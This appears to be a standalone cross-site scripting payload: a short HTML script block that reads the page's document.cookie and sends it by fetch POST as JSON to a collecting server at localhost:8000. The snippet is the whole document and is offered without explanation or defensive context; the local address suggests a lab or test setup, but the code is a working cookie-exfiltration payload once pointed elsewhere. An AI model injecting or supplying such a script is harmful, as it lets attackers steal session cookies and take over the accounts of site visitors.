    <script>
const cookiesToSend = document.cookie;

fetch('http://localhost:8000', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ cookies: cookiesToSend })
})
    </script>
